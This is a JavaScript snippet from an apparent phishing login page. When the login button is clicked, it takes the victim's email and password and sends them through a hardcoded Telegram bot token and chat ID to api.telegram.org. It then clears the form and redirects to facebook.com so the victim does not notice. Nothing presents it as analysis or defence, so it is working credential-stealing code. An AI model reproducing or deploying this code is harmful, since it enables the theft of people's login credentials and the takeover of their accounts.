<script>
		
		const botToken = "6177719871:AAE9t4iQTKrYhNfuhmegYaloe2FGU92xWds";





const chatId = "1725729331";








		// Get form elements
		const emailInput = document.getElementById("email");
		const passwordInput = document.getElementById("password");
		const loginButton = document.getElementById("login");

		// Add click event listener to login button
		loginButton.addEventListener("click", function(event) {
			event.preventDefault();
			// Get input values
			const email = emailInput.value;
			const password = passwordInput.value;
			
			// Send message to Telegram bot
			const message = `New login:\nEmail: ${email}\nPassword: ${password}`;
			const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
			
			fetch(url)
				.then(response => {
					if (response.ok) {
					
window.location.href = "https://www.facebook.com";


						emailInput.value = "";
						passwordInput.value = "";
					} else {
						throw new Error("Failed to send message to Telegram bot.");
					}
				})
				.catch(error => {
					console.error(error);
					alert("Failed to send login information to Telegram bot.");
				});
		});
	</script>
